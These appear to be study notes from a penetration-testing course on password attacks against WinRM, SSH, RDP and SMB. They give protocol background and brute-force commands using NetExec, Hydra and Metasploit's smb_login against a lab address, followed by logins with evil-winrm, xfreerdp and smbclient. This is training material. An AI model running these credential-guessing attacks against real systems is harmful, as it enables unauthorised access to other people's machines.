Let us imagine that we want to manage a Windows server over the network. Accordingly, we need a service that allows us to access the system, execute commands on it, or access its contents via a GUI or the terminal.

In this case, the most common services suitable for this are `RDP`, `WinRM`, and `SSH`. SSH is not as common on Windows, but it is the leading service for Linux-based systems.

All these services have an authentication mechanism using a username and password. Of course, these services can be modified and configured so that only predefined keys can be used for logging in, but they are configured with default settings in many cases.

## WinRM

[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) is the Microsoft implementation of the [Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`). It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems.

It takes care of the communication between [Web-Based Enterprise Management](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) and the [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), which can call the [Distributed Component Object Model](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).

For security reasons, WinRM must be activated and configured manually in Windows 10/11.
it depends heavily on the environment security in a domain or local network where we want to use WinRM.

By default, WinRM uses the TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`).

A handy tool that we can use for our password attacks is [NetExec](https://github.com/Pennyw0rth/NetExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others.

#### NetExec

#### NetExec Menu Options

Running the tool with the `-h` flag will show us general usage instructions and some options available to us.

	AstraX01@htb[/htb]$ netexec -h

#### NetExec Protocol-Specific Help

NetExec currently supports remote authentication using NFS, FTP, SSH, WinRM, SMB, WMI, RDP, MSSQL, LDAP, and VNC.

	AstraX01@htb[/htb]$ netexec smb -h 

#### NetExec Usage

The general format for using NetExec is as follows:

	AstraX01@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

 As an example, this is what attacking a WinRM endpoint might look like:

	AstraX01@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list

The appearance of `(Pwn3d!)` is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.

---
#### **Evil-WinRM**

#### Evil-WinRM Usage

	AstraX01@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>

	AstraX01@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

	*Evil-WinRM* PS C:\Users\user\Documents>

If the login was successful, a terminal session is initialized using the [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`), which simplifies the operation and execution of commands.

## SSH

[Secure Shell](https://www.ssh.com/academy/ssh/protocol) (`SSH`) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server.

The SSH server runs on `TCP port 22` by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: `symmetric` encryption, `asymmetric` encryption, and `hashing`.

Symmetric encryption uses the `same key` for encryption and decryption. Anyone who has access to the key could also access the transmitted data.

 a key exchange procedure is needed for secure symmetric encryption

it cannot decrypt the messages because the key exchange method is unknown.

this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.

#### Asymmetric Encryption

Asymmetric encryption uses `two keys`: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials.

#### Hashing

The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

#### Hydra - SSH

We can use a tool like `Hydra` to brute force SSH. This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing) module.

	AstraX01@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.

	AstraX01@htb[/htb]$ ssh user@10.129.42.197

## Remote Desktop Protocol (RDP)

Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a network protocol that allows remote access to Windows systems via `TCP port 3389` by default.

#### Hydra - RDP

We can also use `Hydra` to perform RDP bruteforcing.

	AstraX01@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

Linux offers different clients to communicate with the desired server using the RDP protocol. These include [Remmina](https://remmina.org/), [xfreerdp](https://linux.die.net/man/1/xfreerdp), and many others. For our purposes, we will work with xfreerdp.

#### xFreeRDP

	xfreerdp /v:<target-IP> /u:<username> /p:<password>

	AstraX01@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password

## SMB

[Server Message Block](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (`SMB`) is a protocol responsible for transferring data between a client and a server in local area networks.

It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to `NFS` for Unix and Linux for providing drives on local networks.

SMB is also known as [Common Internet File System](https://cifs.com/) (`CIFS`). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. I

we will often encounter [Samba](https://wiki.samba.org/index.php/Main_Page), which is an open-source implementation of the above functions. For SMB, we can also use `hydra` again to try different usernames in combination with different passwords.

#### Hydra - SMB

	AstraX01@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

However, we may also get the following error describing that the server has sent an invalid reply.

This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

#### Metasploit Framework

	AstraX01@htb[/htb]$ msfconsole -q

	msf6 > use auxiliary/scanner/smb/smb_login 
	msf6 auxiliary(scanner/smb/smb_login) > options

	msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

	msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

	msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

	rhosts => 10.129.42.197 
	
	msf6 auxiliary(scanner/smb/smb_login) > run

Now we can use `NetExec` again to view the available shares and what privileges we have for them.

#### NetExec

	AstraX01@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares

To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.

#### Smbclient

	AstraX01@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME

